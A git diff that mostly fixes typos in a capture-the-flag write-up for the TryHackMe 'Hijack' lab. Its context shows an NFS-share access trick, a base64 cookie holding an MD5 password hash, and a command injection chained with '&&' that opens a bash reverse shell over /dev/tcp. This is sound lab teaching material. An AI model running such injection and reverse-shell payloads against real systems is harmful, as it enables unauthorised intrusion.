@@ -28,7 +28,7 @@ Link: [Hijack](https://tryhackme.com/r/room/hijack)
 
 ![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/52d95a9e-0bfb-4787-9b3c-a5d98b9aed91)
 
-- You cannpt access the mounted share since you are not the owner. You can see that the share is owned by the user (hj_1003). This means that you will have to create the user hj_1003 on your system and switch to that user so that you can access the share. You can do so using the command;
+- You cannot access the mounted share since you are not the owner. You can see that the share is owned by the user (hj_1003). This means that you will have to create the user hj_1003 on your system and switch to that user so that you can access the share. You can do so using the command;
 
   `sudo adduser hj_1003` 
 
@@ -52,12 +52,12 @@ Link: [Hijack](https://tryhackme.com/r/room/hijack)
 
 
 ## Initial Foothold
--Trying to log into the website using the username `admin` and the password `admin` reveals that a user with this name exists but the password is incorrect. Trying this multiple times using default passwords reveals that you only have 5 tries before the system locks you out for 300 seconds.
--You can now try and create a user account to see if there are any parameters, such as cookies, that are present for a user.
+- Trying to log into the website using the username `admin` and the password `admin` reveals that a user with this name exists but the password is incorrect. Trying this multiple times using default passwords reveals that you only have 5 tries before the system locks you out for 300 seconds.
+- You can now try and create a user account to see if there are any parameters, such as cookies, that are present for a user.
 
 ![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/14d4b92e-6253-480b-8875-90ec8c02f3c2)
 
-- You find that there is indeed a cookie for the user that is logged in. Examining this cookies reveals that it is encoded in base64. By decoding it, it can be seen that the cookie is in the format `user:password` where the password is hashed in MD5. 
+- You find that there is indeed a cookie for the user that is logged in. Examining this cookie reveals that it is encoded in base64. By decoding it, it can be seen that the cookie is in the format `user:password` where the password is hashed in MD5. 
 
 ![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6bb348c5-b3f3-4438-9b9e-041e48e54738)
 
@@ -75,7 +75,8 @@ Link: [Hijack](https://tryhackme.com/r/room/hijack)
 
 - While here, you can try to inject a command that gives you a reverse shell. I tried using a semi-colon after inputting ftp but the system detected this as a command injection. The other option is to use `&&` where the second commnad is executed only after the first is completed. With this, you can perform command injection as such to get a reverse shell;
 
-`ftp && bash -c "bash -i >& /dev/tcp/ip/port 0>&1"` where ip is your listening IP and port is your netcat listening port and executing this gives you a shell
+`ftp && bash -c "bash -i >& /dev/tcp/ip/port 0>&1"`
+  where ip is your listening IP and port is your netcat listening port and executing this gives you a shell.
 
 - Viewing the contents of `config.php` reveals credentials for the user rick which you can ssh into.
 - Now, you can get your first flag.
@@ -84,7 +85,7 @@ Link: [Hijack](https://tryhackme.com/r/room/hijack)
 
 
 ## Privilege Escalation
-- Now, let's try to gain a root shell. The first vector I usually try is `sudo -l`. Luckily, that gets us a relevant vector for privesc in this case.
+- Now, let's try to gain a root shell. The first vector I usually try is `sudo -l`. Luckily, that gets you a relevant vector for privesc in this case.
 
 ![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/52762bb7-c521-4165-bf12-28337186ea82)
 
